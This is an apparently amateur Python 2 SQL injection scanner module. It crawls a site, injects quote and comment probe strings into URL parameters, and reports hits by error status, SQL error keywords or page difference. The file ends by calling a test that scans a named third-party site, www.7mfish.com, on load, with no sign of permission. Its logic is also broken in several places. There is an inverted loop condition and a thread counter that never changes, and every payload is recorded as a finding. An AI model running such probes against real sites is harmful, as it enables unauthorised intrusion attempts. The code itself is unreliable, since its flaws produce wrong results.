import requests
import re
import difflib
import threading
import queue
import lib.spider.Spider_bak


def info():
    info = {
        'name': 'sql',
        'path': 'SQLInjectionScanner',
        'fullname': 'SWEP SQL INJECTION SCANNER',
        'description': 'A simple SQL Injection scanner.',
        'parameters': {
            'Url': 'Target URL.',
            'Threads': 'Threads. Default: 10',
            'Protocol': 'Protocol. Default: http',
            'Timeout': 'Request timeout. Default: 3'
        },
        'author': 'BERACHER security',
        'date': '2019-01-12'
    }
    return info



class Scanner():
    def __init__(self):
        self.Url = None
        self.Threads = 10
        self.Timeout = 3
        self._Counter = 0
        self._Ratio = 0.9
        self.Protocol = 'http'
        self.KeywordList = ['w', '\') ','")' , '%23', '--w']
        self.Spider = lib.spider.Spider_bak.Spider()
        self.differ = difflib.SequenceMatcher()
        # self.Spider.url = self.Url
        # self.Spider.Threads = self.Threads
        # self.Spider.Protocol = self.Protocol
        self.queue = queue.Queue()
        self.UrlList = []
        self.Name = 'SQLi'


    def GetSitePages(self, *PageList):
        self.Spider.url = self.Url
        self.Spider.Threads = self.Threads
        self.Spider.Protocol = self.Protocol
        if PageList:
            PageList = PageList[0]
        else:
            PageList = self.Spider.SpiderSite()
        ParmDict = {} # Dict: {url:{arg: val}}

        for url in PageList:
            try:
                UrlList= url.split('?')
                if len(UrlList) != 1:
                    url, args = UrlList
                else:
                    continue
                parms = args.split('&')
                if url not in ParmDict.keys():
                    ParmDict[url] = {}
                for Parm in parms:
                    ArgList = Parm.split('=')
                    if len(ArgList) > 1:
                        arg, val = ArgList
                    else:
                        arg = ArgList[0]
                        val = ''
                    if arg not in ParmDict[url].keys():
                        ParmDict[url][arg] = val
                    print lambda args: ParmDict[url]
            except Exception, e:
                print '[!] Error: Failed to parse parms: %s' %(str(e))
        return ParmDict


    def CheckSQLInjection(self):
        ParmDict = self.GetSitePages()
        Payloads = []
        self.Threads = int(self.Threads)
        self.Timeout = int(self.Timeout)
        for url in ParmDict.keys():
            try:
                if not self.Url:
                    print '[!] Error: URL not specified.'
                RawUrl = '%s://%s/%s?' %(self.Protocol, self.Url, url)
                PayloadList = self.GenPayload(RawUrl, ParmDict[url]) # {url:{parm:keyword}}
                self.queue.put(PayloadList)
            except Exception, e:
                print '[!] Error generating payload: %s' %(str(e))
        try:
            while not self.queue.qsize() != 0:
                if self.Threads > self._Counter:
                    thread = threading.Thread(target=self.CheckVunerability, args=[self.queue.get()])
                    thread.start()
        except KeyboardInterrupt:
            print '[*] Keyboard interrupt, Quitting.'
        except Exception, e:
            print '[!] Error checking SQL injection: %s' %(str(e))
        return self.UrlList


    def GenPayload(self, url, Payloads): # Gen payload: first parm, second parm, both parm
        RawUrl = url
        PayloadList = []
        for parm in Payloads.keys():
            value = Payloads[parm]
            url += '%s=%s&' %(parm, value)
        url = url.rstrip('&')
        for Keyword in self.KeywordList:
            Payload = RawUrl
            for parm in Payloads.keys():
                value = Payloads[parm]
                Payload += '%s=%s%s&' %(parm, value, Keyword)
            Payload = Payload.rstrip('&')
            PayloadList.append(Payload)
        PayloadDict = {url:PayloadList}
        return PayloadDict


    def CheckVunerability(self, UrlDict): # Check page keyword, if not then difference.
        for raw in UrlDict.keys():
            try:
                RawResp = requests.get(raw, timeout=self.Timeout).text
            except Exception, e:
                print '[!] Failed to fetch raw page: %s' %(str(e))
                continue
            try:
                for payload in UrlDict[raw]:
                    resp = requests.get(payload, timeout=self.Timeout)
                    self.differ.set_seqs(RawResp, resp.text)
                    if resp.status_code == 500:
                        print '[*] %s seems vulnerable to SQL injection: Status code.' %(str(payload))
                    elif re.findall('Error|SQL Error|sql|database|Syntax|Error \d{4} .*|\(\d{6}\)|failed|You have an error in your SQL syntax', resp.text, re.I):
                        print '[*] %s seems vulnerable to SQL injection: Keyword.' %(str(payload))
                    elif self.differ.ratio() < self._Ratio:
                            print '[*] %s seems vulnerable to SQL injection: ratio' %(str(payload))
                    else:
                        pass
                    self.UrlList.append(payload)
            except Exception, e:
                print '[!] Error checking vulnerability: %s' %(str(e))
                pass
        return self.UrlList


    def Scan(self):
        self.CheckSQLInjection()
        return self.UrlList


    def info(self):
        InformationList = info()
        args = InformationList['parameters']
        print '[*] Incoming scanner information:'
        print '[*] Scanner name: %s' %(InformationList['name'])
        print ' |   %s' %(InformationList['fullname'])
        print ' |   Description: %s' %(InformationList['description'])
        print ' |   Author: %s' %(InformationList['author'])
        print ' |   Date: %s' %(InformationList['date'])
        print ' |   Arguments: Total %i' %(len(args))
        print ' |    |  NAME        DESCRIPTION'
        print ' |    |  ----        `-----------'
        for item in args.keys():
            print ' |    |  %s%s' %(item.ljust(12), args[item])
        print ' |'
        print '[*] Scanner information end.'


def test():
    scanner = Scanner()
    scanner.Url = 'www.7mfish.com'
    scanner.Scan()

test()